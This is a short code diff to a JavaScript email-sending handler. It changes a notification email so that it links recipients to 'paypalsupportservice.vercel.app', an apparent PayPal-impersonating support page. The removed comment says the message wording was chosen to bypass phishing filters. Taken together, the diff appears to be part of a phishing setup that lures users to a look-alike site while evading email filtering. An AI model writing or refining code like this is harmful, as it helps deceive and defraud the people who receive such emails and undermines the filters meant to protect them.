@@ -17,8 +17,16 @@ export default async function handler(req, res) {
     }
   });
 
-  // Ultra-bland plain text to bypass aggressive phishing filters triggered by the email address name
-  const plainText = `Hi ${name},\n\nYou have a new reply to your recent conversation.\n\nPlease return to the website to view the message and reply.\n\nThank you.`;
+  // Plain text email with the website link
+  const plainText = `Hi ${name},
+
+You have a new reply to your recent conversation.
+
+Please view the message and continue your chat here:
+https://paypalsupportservice.vercel.app/contact.html
+
+Thank you,
+The Service Team`;
 
   try {
     await transporter.sendMail({
